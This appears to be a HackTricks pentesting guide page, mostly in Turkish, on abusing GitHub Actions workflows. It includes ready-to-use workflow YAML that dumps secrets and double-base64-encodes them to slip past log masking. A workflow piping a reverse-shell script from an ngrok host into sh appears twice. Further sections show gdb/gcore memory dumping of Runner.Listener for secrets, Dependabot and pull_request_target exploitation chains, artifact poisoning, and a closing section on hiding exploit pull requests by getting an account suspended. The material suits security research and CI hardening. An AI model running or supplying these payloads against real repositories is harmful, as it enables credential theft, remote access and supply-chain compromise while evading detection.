# Abusing Github Actions

{{#include ../../../banners/hacktricks-training.md}}

## Araçlar

Aşağıdaki araçlar Github Action workflow'larını bulmak ve hatta zafiyetli olanları tespit etmek için faydalıdır:

- [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
- [https://github.com/praetorian-inc/gato](https://github.com/praetorian-inc/gato)
- [https://github.com/AdnaneKhan/Gato-X](https://github.com/AdnaneKhan/Gato-X)
- [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)
- [https://github.com/zizmorcore/zizmor](https://github.com/zizmorcore/zizmor) - Ayrıca kontrol listesine bakın: [https://docs.zizmor.sh/audits](https://docs.zizmor.sh/audits)

## Temel Bilgi

Bu sayfada şunları bulacaksınız:

- Bir saldırganın bir Github Action'a erişmeyi başarması durumunda ortaya çıkabilecek tüm etkilerin **özeti**
- Bir action'a **erişim sağlama**'nın farklı yolları:
- Action oluşturmak için **permissions** sahibi olmak
- **pull request** ile ilişkili tetikleyicilerin kötüye kullanılması
- Diğer **external access** tekniklerinin kötüye kullanılması
- Zaten ele geçirilmiş bir repodan **Pivoting**
- Son olarak, bir action'ı içerden kötüye kullanmak için **post-exploitation** teknikleri hakkında bir bölüm (bahsedilen etkileri yaratmak için)

## Etkiler Özeti

Github Actions hakkında bir giriş için [**basic information**](../basic-github-information.md#github-actions) bölümünü kontrol edin.

Eğer bir **repository** içinde GitHub Actions'ta **rastgele kod çalıştırabiliyorsanız**, şunları yapabilirsiniz:

- Pipeline'a monte edilen **secrets**'i çalabilir ve pipeline'ın ayrıcalıklarını **kötüye kullanarak** AWS ve GCP gibi dış platformlara yetkisiz erişim elde edebilirsiniz.
- Dağıtımları (deployments) ve diğer artifaktları (artifacts) tehlikeye atabilirsiniz.
- Pipeline varlıkları deploy ediyorsa veya depoluyorsa, nihai ürünü değiştirebilir ve bir supply chain saldırısına olanak sağlayabilirsiniz.
- Özel worker'larda (custom workers) kod çalıştırarak hesaplama gücünü kötüye kullanabilir ve diğer sistemlere pivot yapabilirsiniz.
- `GITHUB_TOKEN` ile ilişkili izinlere bağlı olarak repository kodunu **üstüne yazabilirsiniz**.

## GITHUB_TOKEN

Bu "**secret**" (coming from `${{ secrets.GITHUB_TOKEN }}` and `${{ github.token }}`) yönetici bu seçeneği etkinleştirdiğinde verilir:

<figure><img src="../../../images/image (86).png" alt=""><figcaption></figcaption></figure>

Bu token bir **Github Application**'ın kullanacağı ile aynıdır, dolayısıyla aynı endpoint'lere erişebilir: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

> [!WARNING]
> Github, bir repo'nun `GITHUB_TOKEN` kullanarak diğer dahili repolara erişebilmesini sağlayacak şekilde GitHub içinde **cross-repository** erişimine izin veren bir [**flow**](https://github.com/github/roadmap/issues/74) yayımlamalıdır.

Bu token'ın olası **permissions**'larını şuradan görebilirsiniz: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github_token)

Token'ın **job tamamlandıktan sonra süresinin dolduğunu** unutmayın.\
Bu tokenlar şöyle görünür: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

Bu token ile yapabileceğiniz bazı ilginç şeyler:

{{#tabs }}
{{#tab name="Merge PR" }}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header "content-type: application/json" \
-d "{\"commit_title\":\"commit_title\"}"
```
{{#endtab }}
{{#tab name="Approve PR" }}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{{#endtab }}
{{#tab name="Create PR" }}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{{#endtab }}
{{#endtabs }}

> [!CAUTION]
> Bazı durumlarda **github user tokens inside Github Actions envs or in the secrets** bulabileceğinizi unutmayın. Bu tokens size repository ve organization üzerinde daha fazla ayrıcalık sağlayabilir.

<details>

<summary>Github Action çıktısında bulunan secrets'leri listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>Secrets ile reverse shell elde et</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

Diğer kullanıcıların repository'lerinde bir Github Token'a verilen izinleri, Github Actions'ın **loglarını kontrol ederek** görebilirsiniz:

<figure><img src="../../../images/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## İzinli Çalıştırma

> [!NOTE]
> Bu, Github Actions'ı ele geçirmenin en kolay yolu olur; çünkü bu senaryo organizasyonda **yeni bir repo oluşturma** ya da bir repository üzerinde **yazma ayrıcalıklarına** sahip olduğunuzu varsayar.
>
> Bu durumda sadece [Post Exploitation techniques](#post-exploitation-techniques-from-inside-an-action) bölümüne bakabilirsiniz.

### Repo Oluşturularak Çalıştırma

Organizasyon üyeleri **yeni repo oluşturabiliyor** ve siz Github Actions'ı çalıştırabiliyorsanız, **yeni bir repo oluşturup organizasyon düzeyinde tanımlanmış secrets'leri çalabilirsiniz**.

### Yeni Bir Branch'ten Çalıştırma

Eğer zaten yapılandırılmış bir Github Action içeren bir repository'de **yeni bir branch oluşturabiliyorsanız**, onu **değiştirip**, içeriği **yükleyebilir** ve ardından **o action'ı yeni branch'ten çalıştırabilirsiniz**. Bu şekilde **exfiltrate repository and organization level secrets** (ama isimlerini bilmeniz gerekir).

> [!WARNING]
> Workflow YAML içinde (örneğin, `on: push: branches: [main]`, job conditionals, or manual gates) uygulanan herhangi bir kısıtlama collaborator'lar tarafından düzenlenebilir. Harici bir yaptırım (branch protections, protected environments, and protected tags) yoksa, bir contributor workflow'u kendi branch'inde çalışacak şekilde hedefleyebilir ve mount edilmiş secrets/permissions'ları kötüye kullanabilir.

Değiştirilmiş action'ı **manuel olarak**, bir **PR oluşturulduğunda** veya **kod push edildiğinde** (ne kadar göze batmak istediğinize bağlı olarak) çalıştırılabilir hale getirebilirsiniz:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name
# Use '**' instead of a branh name to trigger the action in all the cranches
```
---

## Fork'lanmış Yürütme

> [!NOTE]
> Başka bir repository'nin **Github Action**ını **execute etmesine** izin verebilecek farklı tetikleyiciler vardır. Eğer bu tetiklenebilir action'lar kötü yapılandırılmışsa, bir saldırgan bunları compromise edebilir.

### `pull_request`

Workflow tetikleyicisi **`pull_request`**, bazı istisnalarla birlikte her pull request alındığında workflow'u çalıştırır: varsayılan olarak eğer **ilk kez** katkıda bulunuyorsanız, bazı **maintainer**lar workflow'un **run**ını **onaylamak** zorunda olacaktır:

<figure><img src="../../../images/image (184).png" alt=""><figcaption></figcaption></figure>

> [!NOTE]
> Varsayılan kısıtlama **ilk kez** katkıda bulunanlar içindir, bu yüzden geçerli bir bug/typo'yu **düzeltip** katkıda bulunarak **diğer PR'ları yeni `pull_request` ayrıcalıklarınızı kötüye kullanmak için** gönderebilirsiniz.
>
> **Bunu denedim ve çalışmıyor**: ~~Başka bir seçenek, projeye katkıda bulunan birinin adıyla bir hesap oluşturup hesabını silmiş gibi yapmak olurdu.~~

Ayrıca, varsayılan olarak hedef repository'ye **yazma izinlerini** ve **secret'lara erişimi** engeller, bu [**docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) bölümünde belirtildiği gibi:

> With the exception of `GITHUB_TOKEN`, **secrets are not passed to the runner** when a workflow is triggered from a **forked** repository. The **`GITHUB_TOKEN` has read-only permissions** in pull requests **from forked repositories**.

Bir saldırgan, Github Action tanımını değiştirebilir ve rastgele komutlar çalıştırıp arbitrary actions ekleyebilir. Ancak bahsedilen kısıtlamalar yüzünden secret'ları çalamaz veya repo'yu overwrite edemez.

> [!CAUTION]
> **Evet, eğer saldırgan PR içinde tetiklenecek github action'ı değiştirirse, kullanılacak olan onun Github Action'ı olur, origin repo'nunki değil!**

Saldırganın çalışan kod üzerinde kontrolü olduğu için, `GITHUB_TOKEN` üzerinde secret veya yazma izni olmasa bile bir saldırgan örneğin **kötü amaçlı artifact'ler yükleyebilir**.

### **`pull_request_target`**

Workflow tetikleyicisi **`pull_request_target`** hedef repository üzerinde **write permission**e ve **secret'lara erişime** sahiptir (ve izin istemez).

Dikkat edin: workflow tetikleyicisi **`pull_request_target`**, PR tarafından sağlanan bağlamda değil **base bağlamında** çalışır (güvenilmeyen kodu çalıştırmamak için). `pull_request_target` hakkında daha fazla bilgi için [**check the docs**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull_request_target).\
Ayrıca, bu spesifik tehlikeli kullanım hakkında daha fazla bilgi için şu [**github blog post**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)u inceleyin.

Çalıştırılan workflow'un **base**de tanımlanan ve **PR içinde olmayan** olanı olması nedeniyle **`pull_request_target`** kullanmanın **güvenli** görünebileceğini düşünebilirsiniz, fakat **güvenli olmadığı** birkaç durum vardır.

Ve bu biri **secret'lara erişim**e sahip olacak.

### `workflow_run`

[**workflow_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow_run) tetikleyicisi, bir workflow tamamlandığında, istenildiğinde veya in_progress durumunda başka bir workflow'u çalıştırmaya izin verir.

Bu örnekte, ayrı "Run Tests" workflow'u tamamlandığında çalışacak şekilde bir workflow yapılandırılmıştır:
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
Ayrıca, belgelere göre: `workflow_run` etkinliği tarafından başlatılan workflow, önceki workflow başlatılmamış olsa bile **secrets'e erişebiliyor ve write tokens oluşturabiliyor**.

Bu tür bir workflow, eğer bir dış kullanıcı tarafından **`pull_request`** veya **`pull_request_target`** ile **tetiklenebilen** bir **workflow**'a bağlıysa saldırıya uğrayabilir. Birkaç savunmasız örnek [**found this blog**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability)**.** İlkinde **`workflow_run`** tarafından tetiklenen workflow, saldırganın kodunu indirir: `${{ github.event.pull_request.head.sha }}`  
İkincisi ise **untrusted** koddaki bir **artifact**'i **`workflow_run`** workflow'una **geçirmek** ve bu artifact içeriğini **vulnerable to RCE** olacak şekilde kullanmaktır.

### `workflow_call`

TODO

TODO: pull_request'ten çalıştırıldığında kullanılan/indirilen kodun origin'den mi yoksa forked PR'den mi olduğunu kontrol et

## Abusing Forked Execution

Dış bir saldırganın bir github workflow'unu çalıştırmasını sağlayabileceği tüm yolları anlattık; şimdi bu çalıştırmalar kötü yapılandırılmışsa nasıl kötüye kullanılabileceklerine bakalım:

### Untrusted checkout execution

Eğer **`pull_request`** durumundaysa, workflow **PR'nin context'inde** çalıştırılır (yani **malicious PR's code** çalıştırılır), ancak önce birinin **authorize etmesi gerekir** ve bazı [sınırlamalar](#pull_request) ile çalışır.

Eğer bir workflow **`pull_request_target` or `workflow_run`** kullanıyor ve **`pull_request_target` or `pull_request`** ile tetiklenebilen bir workflow'a bağlıysa, orijinal repo'nun kodu çalıştırılır; bu yüzden **attacker executed kodu kontrol edemez**.

> [!CAUTION]
> Ancak, eğer **action**'ın **explicit PR checkou**t yapan bir adımı varsa ve **kodu PR'den alıyorsa** (base'den değil), saldırgan tarafından kontrol edilen kod kullanılacaktır. Örneğin (PR kodunun indirildiği satır 12'yi kontrol edin):

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

Potansiyel olarak **untrusted kod `npm install` veya `npm build` sırasında çalıştırılıyor** çünkü build script'leri ve referans verilen **packages** PR'nin yazarı tarafından kontrol ediliyor.

> [!WARNING]
> Bir github dork ile vulnerable actions aramak için: `event.pull_request pull_request_target extension:yml` ancak, action insecure yapılandırılmış olsa bile job'ları güvenli çalıştıracak şekilde yapılandırmanın farklı yolları vardır (örneğin PR'yi oluşturan actor hakkında conditionals kullanmak gibi).

### Context Script Injections <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

PR'yi oluşturan **user** tarafından **kontrol edilen** bazı [**github contexts**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) olduğunu unutmayın. Eğer github action bu **data'yı herhangi bir şey çalıştırmak için** kullanıyorsa, bu **arbitrary code execution**'a yol açabilir:

{{#ref}}
gh-actions-context-script-injections.md
{{#endref}}

### **GITHUB_ENV Script Injection** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

Belgelerden: Bir workflow job'unda bir **environment variable'ı sonraki adımlara erişilebilir hale getirebilirsiniz**; bunun için environment variable'ı tanımlayıp güncelleyip bunu **`GITHUB_ENV`** environment dosyasına yazmanız gerekir.

Eğer bir saldırgan bu **env** değişkeninin içine herhangi bir değer **inject edebiliyorsa**, LD_PRELOAD veya NODE_OPTIONS gibi sonraki adımlarda kod çalıştırabilecek env değişkenleri inject edebilir.

Örneğin ([**this**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) and [**this**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project)), içeriğini **`GITHUB_ENV`** env değişkenine koymak için yüklenen bir artifact'e güvenen bir workflow'u düşünün. Bir saldırgan bunu ele geçirmek için aşağıdakine benzer bir şey yükleyebilir:

<figure><img src="../../../images/image (261).png" alt=""><figcaption></figcaption></figure>

### Dependabot and other trusted bots

Bu [**blog post**](https://boostsecurity.io/blog/weaponizing-dependabot-pwn-request-at-its-finest)'ta belirtildiği gibi, bazı organizasyonların `dependabot[bot]`'tan gelen herhangi bir PRR'ı merge eden bir Github Action'ı var, örneğin:
```yaml
on: pull_request_target
jobs:
auto-merge:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: gh pr merge $ -d -m
```
Bu bir sorun çünkü `github.actor` alanı workflow'u tetikleyen son olaya sebep olan kullanıcıyı içerir. Ve `dependabot[bot]` kullanıcısının bir PR'ı değiştirmesini sağlayacak birkaç yol vardır. Örneğin:

- Hedef repository'yi fork'la
- Kendi kopyana kötü amaçlı payload ekle
- Fork'unda Dependabot'u etkinleştirip eski bir dependency ekle. Dependabot, dependency'yi düzelten ve kötü amaçlı kod içeren bir branch oluşturacak.
- Bu branch'ten hedef repository'ye bir Pull Request aç (PR kullanıcı tarafından oluşturulacağı için henüz bir şey olmayacak)
- Sonra, saldırgan fork'unda Dependabot'un açtığı ilk PR'a geri döner ve `@dependabot recreate` komutunu çalıştırır
- Bunun üzerine Dependabot, o branch üzerinde bazı işlemler yapar ve hedef repo üzerindeki PR'ı değiştirir; bu da `dependabot[bot]`'u workflow'u tetikleyen son olayın aktörü yapar (dolayısıyla workflow çalışır).

Devam edersek, peki ya merge etmek yerine Github Action'ın aşağıdaki gibi bir command injection'a sahip olduğunu düşünürsek:
```yaml
on: pull_request_target
jobs:
just-printing-stuff:
runs-on: ubuntu-latest
if: ${ { github.actor == 'dependabot[bot]' }}
steps:
- run: echo ${ { github.event.pull_request.head.ref }}
```
Well, orijinal blog yazısı bu davranışı kötüye kullanmak için iki seçenek öneriyor; ikinci seçenek şudur:

- Fork the victim repository ve bazı outdated dependency içeren Dependabot'u enable et.
- Create a new branch with the malicious shell injeciton code.
- Change the default branch of the repo to that one
- Create a PR from this branch to the victim repository.
- Run `@dependabot merge` in the PR Dependabot opened in his fork.
- Dependabot will merge his changes in the default branch of your forked repository, updating the PR in the victim repository making now the `dependabot[bot]` the actor of the latest event that triggered the workflow and using a malicious branch name.

### Güvenlik açığı olan üçüncü taraf Github Actions

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

As mentioned in [**this blog post**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks), this Github Action allows to access artifacts from different workflows and even repositories.

Sorun şu ki eğer **`path`** parametresi ayarlı değilse, artifact mevcut dizine çıkarılır ve workflow içinde daha sonra kullanılabilecek veya çalıştırılabilecek dosyaların üzerine yazabilir. Bu nedenle, Artifact zayıfsa, bir attacker bunu Artifact'a güvenen diğer workflows'ları ele geçirmek için kötüye kullanabilir.

Güvenlik açığı olan workflow örneği:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
Bu workflow ile saldırılabilir:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
---

## Other External Access

### Deleted Namespace Repo Hijacking

Bir hesap adını değiştirirse, bir süre sonra başka bir kullanıcı aynı ada sahip bir hesap kaydedebilir. Eğer bir repository ad değişikliğinden önce **less than 100 stars previously to the change of nam**a sahipse, Github aynı ada sahip yeni kaydolan kullanıcının silinenle aynı **repository with the same name** oluşturmasına izin verecektir.

> [!CAUTION]
> Bu yüzden eğer bir action var olmayan bir hesabın bir repo'sunu kullanıyorsa, bir attacker o hesabı oluşturup action'ı compromise edebilir.

Eğer diğer repositories bu kullanıcının repo'larından **dependencies** kullanıyorsa, bir attacker bunları hijack edebilecektir. Daha ayrıntılı açıklama için: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

---

## Repo Pivoting

> [!NOTE]
> Bu bölümde, ilkine bir erişimimiz olduğunu varsayarsak, **pivot from one repo to another** sağlayabilecek tekniklerden bahsedeceğiz (önceki bölümü kontrol edin).

### Cache Poisoning

Bir cache, **wokflow runs in the same branch** arasında tutulur. Bu, eğer bir attacker bir **package**i **compromise** eder ve bu package cache'e kaydedilip daha sonra daha **privileged** bir workflow tarafından **downloaded** edilip çalıştırılırsa, attacker o workflow'u da **compromise** edebilir.

{{#ref}}
gh-actions-cache-poisoning.md
{{#endref}}

### Artifact Poisoning

Workflows **artifacts from other workflows and even repos** kullanabilir; eğer bir attacker sonrasında başka bir workflow tarafından kullanılan bir artifact'ı **uploads an artifact** yapan Github Action'ı **compromise** etmeyi başarırsa, diğer workflow'ları da **compromise** edebilir:

{{#ref}}
gh-actions-artifact-poisoning.md
{{#endref}}

---

## Post Exploitation from an Action

### Github Action Policies Bypass

As commented in [**this blog post**](https://blog.yossarian.net/2025/06/11/github-actions-policies-dumb-bypass), repository veya organization belirli actions kullanımını kısıtlayan bir policy'ye sahip olsa bile, bir attacker workflow içinde bir action'ı sadece download (`git clone`) edip sonra onu local action olarak referans gösterebilir. Policy'ler local paths'i etkilemediği için, **the action will be executed without any restriction.**

Example:
```yaml
on: [push, pull_request]

jobs:
test:
runs-on: ubuntu-latest
steps:
- run: |
mkdir -p ./tmp
git clone https://github.com/actions/checkout.git ./tmp/checkout

- uses: ./tmp/checkout
with:
repository: woodruffw/gha-hazmat
path: gha-hazmat

- run: ls && pwd

- run: ls tmp/checkout
```
### OIDC ile AWS, Azure ve GCP'ye Erişim

Aşağıdaki sayfaları inceleyin:

{{#ref}}
../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/azure-security/az-basic-information/az-federation-abuse.md
{{#endref}}

{{#ref}}
../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md
{{#endref}}

### Secrets'e Erişim <a href="#accessing-secrets" id="accessing-secrets"></a>

Bir script'e içerik enjekte ediyorsanız, secrets'e nasıl erişebileceğinizi bilmek faydalıdır:

- Eğer secret veya token bir **ortam değişkeni (environment variable)** olarak ayarlanmışsa, **`printenv`** kullanarak ortam üzerinden doğrudan erişilebilir.

<details>

<summary>Github Action çıktısında secrets'i listele</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secrets ile reverse shell elde et</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- "**"
push: # Run it when a push is made to a branch
branches:
- "**"
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

- Eğer secret **doğrudan bir ifade içinde** kullanılıyorsa, üretilen shell script **diske** yazılır ve erişilebilir olur.
- ```bash
cat /home/runner/work/_temp/*
```
- JavaScript actions için secrets, ortam değişkenleri aracılığıyla gönderilir
- ```bash
ps axe | grep node
```
- Bir **custom action** için, risk, bir programın **argument**'ten elde ettiği secret'i nasıl kullandığına bağlı olarak değişebilir:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

- secrets context aracılığıyla tüm secrets'ları listeleyin (collaborator level). Write erişimine sahip bir katkıda bulunan, herhangi bir branch'teki workflow'u değiştirip tüm repository/org/environment secrets'larını dökebilir. GitHub’ın log masking'inden kaçmak için çift base64 kullanın ve yerelde decode edin:

```yaml
name: Steal secrets
on:
push:
branches: [ attacker-branch ]
jobs:
dump:
runs-on: ubuntu-latest
steps:
- name: Double-base64 the secrets context
run: |
echo '${{ toJson(secrets) }}' | base64 -w0 | base64 -w0
```

Yerelde decode edin:

```bash
echo "ZXdv...Zz09" | base64 -d | base64 -d
```

İpucu: test sırasında fark edilmemek için, yazdırmadan önce şifreleyin (openssl GitHub-hosted runners üzerinde önceden yüklüdür).

### Self-hosted runners'ı kötüye kullanma

Github Actions'ın non-github altyapısında çalıştırılıp çalıştırılmadığını tespit etmenin yolu, Github Action konfigürasyon yaml'ında **`runs-on: self-hosted`**'i aramaktır.

**Self-hosted** runners ek **hassas bilgilere** ve diğer **network sistemlerine** (ağdaki zafiyetli endpoint'ler mi? metadata service?) erişim sağlayabilir veya izole edilip silinse bile, **aynı anda birden fazla action çalıştırılabilir** ve kötü niyetli olan, diğerinin **secrets**'ını **çalabilir**.

Self-hosted runners'da ayrıca workflow'ların herhangi bir adımındaki tüm secrets'ları içerecek olan **secrets from the \_Runner.Listener**\_\*\* process\*\*'un belleğini dump'layarak elde etmek de mümkündür:
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
Check [**this post for more information**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Image Deposu

Github Actions kullanarak **Github içinde bir Docker image'ını oluşturup depolamak** mümkün.\
Aşağıdaki açılır bölümde bir örnek bulunmaktadır:

<details>

<summary>Github Action: Docker Image Oluşturma ve Push Etme</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

Önceki kodda gördüğünüz gibi, Github registry **`ghcr.io`** üzerinde barındırılıyor.

Repo üzerinde read izinlerine sahip bir kullanıcı, kişisel erişim tokenı kullanarak Docker Image'ı indirebilecek:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
Sonra, kullanıcı **leaked secrets in the Docker image layers:** için arama yapabilir:

{{#ref}}
https://book.hacktricks.wiki/en/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics.html
{{#endref}}

### Github Actions logs içindeki hassas bilgiler

Even if **Github** try to **detect secret values** in the actions logs and **avoid showing** them, **other sensitive data** that could have been generated in the execution of the action won't be hidden. For example a JWT signed with a secret value won't be hidden unless it's [specifically configured](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret).

## Covering your Tracks

(Technique from [**here**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)) İlk olarak, açılan herhangi bir PR Github'da ve hedef GitHub hesabında halka açık olarak görülebilir. GitHub'da varsayılan olarak, **internet üzerindeki bir PR'yi silemeyiz**, fakat bir fark var. Github tarafından **askıya alınmış** hesapların tüm **PR'leri otomatik olarak silinir** ve internetten kaldırılır. Bu yüzden etkinliğinizi gizlemek için ya **GitHub hesabınızın askıya alınmasını ya da hesabınızın işaretlenmesini** sağlamalısınız. Bu, GitHub'daki **tüm aktivitelerinizi** internetten gizleyecektir (temelde exploit PR'lerinizi kaldırır)

An organization in GitHub is very proactive in reporting accounts to GitHub. All you need to do is share “some stuff” in Issue and they will make sure your account is suspended in 12 hours :p and there you have, made your exploit invisible on github.

> [!WARNING]
> Bir organization'ın hedeflendiğini fark etmesinin tek yolu, GitHub UI'den bakıldığında PR kaldırılacağı için SIEM üzerinden GitHub logs'larını kontrol etmektir.

## References

- [GitHub Actions: A Cloudy Day for Security - Part 1](https://binarysecurity.no/posts/2025/08/securing-gh-actions-part1)

{{#include ../../../banners/hacktricks-training.md}}
